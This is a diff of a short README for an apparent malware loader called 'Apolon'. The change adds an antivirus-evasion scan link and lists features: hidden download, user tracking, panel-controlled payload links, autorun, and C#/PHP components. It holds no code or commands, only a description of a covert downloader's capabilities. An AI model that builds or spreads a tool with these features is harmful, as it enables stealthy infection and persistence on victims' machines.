@@ -1,6 +1,17 @@
 # -Loader-Project-Apolon
-This old version.
+https://antiscan.me/scan/new/result?id=lEbzEBaT2G9n
 
-Это старая версия, новую сливать не буду.
+Updated due to being bored in quarantine.
 
-C#, PHP 5.6
+# Functional
+-Hidden download
+
+-Saving Users
+
+-Dynamic interchangeable links from the panel (DLR)
+
+-Autorun
+
+C#, Framework 4, PHP 7.1
+
+Only for '.exe' files now.
